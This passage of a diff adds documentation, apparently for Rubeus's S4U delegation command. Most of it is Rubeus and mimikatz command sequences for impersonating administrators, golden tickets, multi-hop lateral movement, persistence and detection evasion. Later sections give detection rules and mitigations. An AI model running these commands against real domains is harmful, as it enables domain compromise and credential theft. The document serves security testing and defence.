+        **Forest Trust Exploitation:**
+        ```bash
+        # Cross-forest delegation
+        Rubeus.exe s4u /user:svc_internal /rc4:hash /domain:internal.corp /impersonateuser:administrator /msdsspn:cifs/external-server.partner.local /targetdomain:partner.local /targetdc:dc.partner.local
+        ```
+      </Step>
+
+      <Step title="Advanced Cross-Domain Techniques">
+        **Golden Ticket Integration:**
+        ```bash
+        # Create cross-domain golden ticket
+        Rubeus.exe golden /user:administrator /domain:child.corp.local /sid:S-1-5-21-child-domain /krbtgt:hash /sids:S-1-5-21-parent-domain-519
+
+        # Use for cross-domain delegation
+        Rubeus.exe s4u /ticket:golden.kirbi /impersonateuser:administrator /msdsspn:cifs/parent-server.corp.local /targetdomain:corp.local
+        ```
+
+        **Service Account Targeting:**
+        - Target service accounts in trusted domains
+        - Exploit cross-domain service relationships
+        - Leverage forest-wide administrative groups
+        - Chain delegation across multiple domains
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Advanced Persistence">
+    <Steps>
+      <Step title="Delegation-Based Persistence">
+        **Renewable Ticket Strategy:**
+        ```bash
+        # Create long-lived delegated tickets
+        Rubeus.exe s4u /user:svc_persist /rc4:hash /impersonateuser:administrator /msdsspn:cifs/critical.corp.local /outfile:persist.kirbi
+
+        # Renew before expiration
+        Rubeus.exe renew /ticket:persist.kirbi /outfile:renewed.kirbi
+
+        # Maintain access
+        Rubeus.exe ptt /ticket:renewed.kirbi
+        ```
+
+        **Service Account Rotation:**
+        - Identify multiple delegation-enabled accounts
+        - Rotate between different service accounts
+        - Distribute delegation activities
+        - Maintain backup access methods
+      </Step>
+
+      <Step title="Stealth Considerations">
+        **Operational Security:**
+        - Use AES encryption when possible
+        - Avoid bulk delegation activities
+        - Blend with normal service patterns
+        - Implement delays between operations
+
+        **Detection Evasion:**
+        ```bash
+        # OPSEC-conscious delegation
+        Rubeus.exe s4u /user:svc_web /aes256:key /impersonateuser:normaluser /msdsspn:http/web.corp.local /opsec /ptt
+
+        # Targeted single-service access
+        Rubeus.exe s4u /user:svc_app /rc4:hash /impersonateuser:serviceaccount /msdsspn:MSSQLSvc/db.corp.local:1433 /ptt
+        ```
+      </Step>
+
+      <Step title="Delegation Chaining">
+        **Multi-Hop Scenarios:**
+        1. Initial service account compromise
+        2. Delegate to intermediate service
+        3. Extract credentials from intermediate
+        4. Chain to final high-value target
+        5. Establish persistent access
+
+        **Attack Chain Example:**
+        ```bash
+        # Step 1: Web service to database
+        Rubeus.exe s4u /user:svc_web /rc4:hash1 /impersonateuser:administrator /msdsspn:MSSQLSvc/db.corp.local:1433 /ptt
+
+        # Step 2: Access database, extract service account
+        # [Database access and credential extraction]
+
+        # Step 3: Database service to domain controller
+        Rubeus.exe s4u /user:svc_db /rc4:hash2 /impersonateuser:administrator /msdsspn:ldap/dc01.corp.local /ptt
+        ```
+      </Step>
+    </Steps>
+  </Tab>
+</Tabs>
+
+<Tabs>
+  <Tab title="Domain Escalation">
+    <Steps>
+      <Step title="Service Account Discovery">
+        **Target Identification:**
+        ```powershell
+        # Find high-privilege delegation targets
+        Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo | Where {$_.msDS-AllowedToDelegateTo -like "*ldap*" -or $_.msDS-AllowedToDelegateTo -like "*gc*"}
+
+        # Identify domain controller delegation
+        Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo | Where {$_.msDS-AllowedToDelegateTo -match "ldap/.*\.corp\.local"}
+        ```
+
+        **Service Account Compromise:**
+        - Kerberoast delegation-enabled accounts
+        - Target service accounts with DC access
+        - Extract credentials via memory dumps
+        - Golden ticket for service accounts
+      </Step>
+
+      <Step title="Domain Controller Access">
+        <CardGroup cols={2}>
+          <Card title="LDAP Service Targeting" icon="sitemap">
+            ```bash
+            # LDAP delegation to DC
+            Rubeus.exe s4u /user:svc_exchange /rc4:hash /impersonateuser:administrator /msdsspn:ldap/dc01.corp.local /ptt
+
+            # Global catalog access
+            Rubeus.exe s4u /user:svc_app /aes256:key /impersonateuser:administrator /msdsspn:gc/dc01.corp.local /ptt
+            ```
+
+            **Result:** Directory service administrative access
+          </Card>
+          <Card title="HOST Service Escalation" icon="crown">
+            ```bash
+            # Full administrative access
+            Rubeus.exe s4u /user:svc_backup /rc4:hash /impersonateuser:administrator /msdsspn:host/dc01.corp.local /ptt
+
+            # Alternative service expansion
+            Rubeus.exe s4u /user:svc_web /aes256:key /impersonateuser:administrator /msdsspn:http/dc01.corp.local /altservice:host,cifs,ldap /ptt
+            ```
+
+            **Result:** Domain admin equivalent access
+          </Card>
+        </CardGroup>
+      </Step>
+
+      <Step title="Verification & Exploitation">
+        **Access Confirmation:**
+        ```bash
+        # Verify delegation success
+        Rubeus.exe klist
+
+        # Test domain admin access
+        dir \\dc01.corp.local\c$
+        net user /domain
+
+        # DCSync capability
+        mimikatz "lsadump::dcsync /user:krbtgt"
+        ```
+
+        **Persistence Establishment:**
+        - Create additional delegation accounts
+        - Extract KRBTGT hash for golden tickets
+        - Add to administrative groups
+        - Deploy backdoor accounts
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Lateral Movement">
+    <Steps>
+      <Step title="Service Tier Escalation">
+        **Web Tier to Database:**
+        ```bash
+        # Web service delegation to database
+        Rubeus.exe s4u /user:svc_web /rc4:hash /impersonateuser:administrator /msdsspn:MSSQLSvc/sql01.corp.local:1433 /ptt
+
+        # Alternative database targeting
+        Rubeus.exe s4u /user:svc_app /aes256:key /impersonateuser:administrator /msdsspn:oracle/erp.corp.local:1521 /ptt
+        ```
+
+        **Database to File Services:**
+        ```bash
+        # Database service to file server
+        Rubeus.exe s4u /user:svc_sql /rc4:hash /impersonateuser:administrator /msdsspn:cifs/shares.corp.local /ptt
+
+        # Multi-target file access
+        Rubeus.exe s4u /user:svc_db /aes256:key /impersonateuser:administrator /msdsspn:host/fileserver.corp.local /altservice:cifs /ptt
+        ```
+      </Step>
+
+      <Step title="Infrastructure Hopping">
+        **Management Server Access:**
+        ```bash
+        # SCCM server delegation
+        Rubeus.exe s4u /user:svc_app /rc4:hash /impersonateuser:administrator /msdsspn:host/sccm.corp.local /ptt
+
+        # Monitoring system access
+        Rubeus.exe s4u /user:svc_web /aes256:key /impersonateuser:administrator /msdsspn:http/monitoring.corp.local /altservice:host /ptt
+
+        # Backup server targeting
+        Rubeus.exe s4u /user:svc_sql /rc4:hash /impersonateuser:administrator /msdsspn:cifs/backup.corp.local /ptt
+        ```
+
+        **Network Infrastructure:**
+        - DNS server delegation
+        - DHCP server access
+        - Network management tools
+        - VPN gateway systems
+      </Step>
+
+      <Step title="Multi-Hop Chaining">
+        <Frame>
+          **Attack Chain Example:**
+          1. **Initial Access:** Web service account
+          2. **First Hop:** Delegate to database server
+          3. **Credential Extraction:** Database service account
+          4. **Second Hop:** Database to file server
+          5. **Lateral Expansion:** File server to domain controller
+        </Frame>
+
+        **Implementation:**
+        ```bash
+        # Hop 1: Web to Database
+        Rubeus.exe s4u /user:svc_web /rc4:hash1 /impersonateuser:administrator /msdsspn:MSSQLSvc/db.corp.local:1433 /ptt
+
+        # [Extract svc_db credentials from database]
+
+        # Hop 2: Database to File Server
+        Rubeus.exe s4u /user:svc_db /rc4:hash2 /impersonateuser:administrator /msdsspn:cifs/shares.corp.local /ptt
+
+        # [Extract additional credentials from file server]
+
+        # Hop 3: File Server to Domain Controller
+        Rubeus.exe s4u /user:svc_backup /rc4:hash3 /impersonateuser:administrator /msdsspn:ldap/dc01.corp.local /ptt
+        ```
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Specialized Scenarios">
+    <Steps>
+      <Step title="Exchange Server Delegation">
+        **High-Privilege Targeting:**
+        ```bash
+        # Exchange to domain controller
+        Rubeus.exe s4u /user:svc_exchange /rc4:hash /impersonateuser:administrator /msdsspn:ldap/dc01.corp.local /ptt
+
+        # Exchange administrative access
+        Rubeus.exe s4u /user:svc_app /aes256:key /impersonateuser:administrator /msdsspn:http/exchange.corp.local /altservice:host /ptt
+        ```
+
+        **Value Proposition:**
+        - Exchange often has broad delegation rights
+        - Access to email data and credentials
+        - Administrative access to mail infrastructure
+        - Potential domain admin escalation path
+      </Step>
+
+      <Step title="SQL Server Exploitation">
+        **Database Administrative Access:**
+        ```bash
+        # SQL Server administrative delegation
+        Rubeus.exe s4u /user:svc_web /rc4:hash /impersonateuser:administrator /msdsspn:MSSQLSvc/sql.corp.local:1433 /ptt
+
+        # Multiple SQL server targeting
+        Rubeus.exe s4u /user:svc_app /aes256:key /impersonateuser:administrator /msdsspn:MSSQLSvc/reporting.corp.local:1433 /altservice:host /ptt
+        ```
+
+        **Post-Exploitation:**
+        - Database administrative access
+        - Credential extraction from databases
+        - OS-level access via xp_cmdshell
+        - Linked server traversal
+      </Step>
+
+      <Step title="Application Server Targeting">
+        **SharePoint Delegation:**
+        ```bash
+        # SharePoint service delegation
+        Rubeus.exe s4u /user:svc_web /rc4:hash /impersonateuser:administrator /msdsspn:http/sharepoint.corp.local /altservice:host,cifs /ptt
+        ```
+
+        **ERP System Access:**
+        ```bash
+        # SAP/Oracle ERP delegation
+        Rubeus.exe s4u /user:svc_app /aes256:key /impersonateuser:administrator /msdsspn:oracle/erp.corp.local:1521 /altservice:host /ptt
+        ```
+
+        **Business Impact:**
+        - Access to business-critical applications
+        - Financial and operational data
+        - Administrative configuration access
+        - Potential for business disruption
+      </Step>
+    </Steps>
+  </Tab>
+</Tabs>
+
+<Tabs>
+  <Tab title="Detection Indicators">
+    <Warning>
+      S4U delegation attacks generate distinctive patterns that can be detected through comprehensive monitoring
+    </Warning>
+
+    <Expandable title="Event Log Analysis" icon="list" defaultOpen>
+      **Primary Event IDs:**
+      - **4769** - Kerberos service ticket was requested
+      - **4770** - Kerberos service ticket was renewed
+      - **4771** - Kerberos pre-authentication failed
+      - **4768** - Kerberos authentication ticket (TGT) was requested
+
+      **S4U-Specific Patterns:**
+      ```text
+      Event 4769 Analysis:
+      - Service Name: Contains target service SPN
+      - Account Name: Service account performing delegation
+      - Client Address: Often ::1 (localhost) for S4U operations
+      - Ticket Options: 0x40810010 (forwardable, renewable)
+      - Ticket Encryption Type: May show downgrade to RC4
+      ```
+
+      **Anomaly Detection:**
+      - Service accounts requesting tickets for administrators
+      - Rapid succession of S4U2Self → S4U2Proxy events
+      - Cross-domain ticket requests
+      - Service tickets for services not in delegation list
+    </Expandable>
+
+    <Expandable title="Behavioral Analysis" icon="chart-line">
+      **Service Account Anomalies:**
+      - Service accounts authenticating outside normal patterns
+      - Requests for high-privilege user impersonation
+      - Access to services outside typical workflow
+      - Authentication from unexpected source IPs
+
+      **Delegation Pattern Analysis:**
+      - Multiple delegation attempts in short timeframes
+      - Failed delegation attempts followed by successful ones
+      - Cross-domain delegation activities
+      - Service substitution patterns (/altservice usage)
+
+      **Network-Level Indicators:**
+      - Kerberos traffic from non-domain member systems
+      - Unusual authentication timing patterns
+      - Multiple service ticket requests to different services
+      - Cross-network authentication attempts
+    </Expandable>
+
+    <Expandable title="Technical Signatures" icon="fingerprint">
+      **API Usage Patterns:**
+      - LsaCallAuthenticationPackage with S4U structures
+      - Multiple rapid Kerberos API calls
+      - Non-standard authentication flows
+      - Service ticket requests with modified PACs
+
+      **Process Behavior:**
+      - Non-service processes performing delegation
+      - Processes running with service account contexts
+      - Memory access patterns consistent with credential extraction
+      - Rubeus or similar tool execution artifacts
+    </Expandable>
+  </Tab>
+
+  <Tab title="Monitoring Strategies">
+    <Steps>
+      <Step title="Event Log Configuration">
+        **Enable Advanced Auditing:**
+        ```bash
+        # Configure audit policies
+        auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
+        auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
+
+        # PowerShell monitoring
+        auditpol /set /subcategory:"PowerShell" /success:enable /failure:enable
+        ```
+
+        **SIEM Integration:**
+        - Centralized log collection
+        - Real-time event correlation
+        - Baseline establishment
+        - Anomaly detection algorithms
+      </Step>
+
+      <Step title="Detection Rules">
+        **Splunk Detection:**
+        ```text
+        # S4U delegation detection
+        index=wineventlog EventCode=4769 Service_Name="*" Account_Name="svc_*" | where like(Account_Name, "%svc_%") AND like(Service_Name, "%ldap%" OR "%cifs%" OR "%host%") | stats count by Account_Name, Service_Name, Client_Address
+
+        # Multiple rapid delegation attempts
+        index=wineventlog EventCode=4769 | bucket _time span=1m | stats count by _time, Account_Name | where count > 10
+        ```
+
+        **Sigma Rules:**
+        ```yaml
+        title: S4U Kerberos Delegation Abuse
+        detection:
+          selection:
+            EventID: 4769
+            ServiceName:
+              - 'ldap/*'
+              - 'cifs/*'
+              - 'host/*'
+            AccountName: 'svc_*'
+          condition: selection
+        ```
+      </Step>
+
+      <Step title="Behavioral Monitoring">
+        **Service Account Baselines:**
+        - Normal authentication patterns
+        - Typical service access requirements
+        - Expected delegation relationships
+        - Standard operational timeframes
+
+        **Anomaly Detection:**
+        - Deviation from baseline behavior
+        - Unusual authentication sources
+        - Unexpected service access patterns
+        - Off-hours delegation activities
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Mitigation Controls">
+    <Steps>
+      <Step title="Configuration Hardening">
+        <CardGroup cols={2}>
+          <Card title="Delegation Minimization" icon="shield">
+            **Best Practices:**
+            - Remove unnecessary delegation configurations
+            - Use resource-based constrained delegation (RBCD)
+            - Implement least-privilege delegation
+            - Regular delegation audits
+          </Card>
+          <Card title="Account Protection" icon="user-shield">
+            **Security Measures:**
+            - Enable "Account is sensitive and cannot be delegated"
+            - Use Protected Users group
+            - Implement strong service account passwords
+            - Regular password rotation
+          </Card>
+        </CardGroup>
+
+        **Technical Controls:**
+        ```powershell
+        # Disable delegation for sensitive accounts
+        Set-ADUser -Identity "administrator" -AccountNotDelegated $true
+
+        # Add to Protected Users group
+        Add-ADGroupMember -Identity "Protected Users" -Members "administrator"
+
+        # Audit delegation configurations
+        Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
+        ```
+      </Step>
+
+      <Step title="Network Security">
+        **Segmentation:**
+        - Isolate service accounts by network segment
+        - Restrict service-to-service communication
+        - Implement micro-segmentation
+        - Monitor cross-segment authentication
+
+        **Access Controls:**
+        - Time-based access restrictions
+        - Source IP validation
+        - Service-specific access policies
+        - Multi-factor authentication requirements
+      </Step>
+
+      <Step title="Detection & Response">
+        **Real-Time Monitoring:**
+        ```yaml
+        # SIEM Alert Configuration
+        Alert: S4U Delegation Detected
+        Trigger: Multiple 4769 events from service account within 5 minutes
+        Action:
+          - Disable service account
+          - Alert security team
+          - Initiate incident response
+          - Capture network traffic
+        ```
+
+        **Incident Response:**
+        1. Isolate affected service accounts
+        2. Reset service account passwords
+        3. Audit delegation configurations
+        4. Review authentication logs
+        5. Assess lateral movement potential
+        6. Implement additional monitoring
+
+        **Proactive Measures:**
+        - Regular delegation audits
+        - Service account inventory
+        - Privilege escalation testing
+        - Security awareness training
+      </Step>
+    </Steps>
+  </Tab>
+</Tabs>
+
+<CardGroup cols={2}>
+  <Card title="Ticket Requests" icon="ticket" href="/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/asktgs">
+    **asktgs** - Manual service ticket requests for delegation preparation
+  </Card>
+  <Card title="Ticket Analysis" icon="magnifying-glass" href="/ghostpack-docs/Rubeus-mdx/commands/management/describe">
+    **describe** - Deep analysis of delegated ticket structure and contents
+  </Card>
+  <Card title="Ticket Injection" icon="upload" href="/ghostpack-docs/Rubeus-mdx/commands/management/ptt">
+    **ptt** - Inject delegated service tickets into current or target sessions
+  </Card>
+  <Card title="Golden Tickets" icon="crown" href="/ghostpack-docs/Rubeus-mdx/commands/forgery/golden">
+    **golden** - Create domain-wide tickets with delegation capabilities
+  </Card>
+  <Card title="Credential Extraction" icon="download" href="/ghostpack-docs/Rubeus-mdx/commands/extraction/dump">
+    **dump** - Extract service account tickets for delegation attacks
+  </Card>
+  <Card title="Session Management" icon="terminal" href="/ghostpack-docs/Rubeus-mdx/commands/management/createnetonly">
+    **createnetonly** - Create isolated sessions for delegated ticket usage
+  </Card>
+</CardGroup>
+
+## Integration Workflows
+
+<Steps>
+  <Step title="Discovery Phase">
+    **Identify delegation opportunities:**
+    ```bash
+    # Find delegation-enabled accounts
+    # PowerShell: Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true}
+
+    # Extract service account credentials
+    Rubeus.exe asktgt /user:discovered_svc /rc4:extracted_hash
+    ```
+  </Step>
+
+  <Step title="Exploitation Phase">
+    **Execute delegation attack:**
+    ```bash
+    # Perform S4U delegation
+    Rubeus.exe s4u /user:svc_account /rc4:hash /impersonateuser:administrator /msdsspn:target_service /ptt
+
+    # Verify successful delegation
+    Rubeus.exe klist
+    ```
+  </Step>
+
+  <Step title="Analysis & Expansion">
+    **Analyze and expand access:**
+    ```bash
+    # Analyze delegated ticket
+    Rubeus.exe describe /ticket:base64_ticket
+
+    # Expand to related services
+    Rubeus.exe s4u /ticket:current_tgt /impersonateuser:administrator /msdsspn:original_service /altservice:cifs,host,ldap /ptt
+    ```
+  </Step>
+
+  <Step title="Persistence & Movement">
+    **Establish persistence and move laterally:**
+    ```bash
+    # Save high-value tickets
+    Rubeus.exe s4u /user:svc_account /rc4:hash /impersonateuser:administrator /msdsspn:ldap/dc.corp.local /outfile:dc_access.kirbi
+
+    # Create dedicated session
+    Rubeus.exe createnetonly /program:cmd.exe
+    Rubeus.exe ptt /ticket:dc_access.kirbi /luid:new_session_luid
+    ```
+  </Step>
+</Steps>
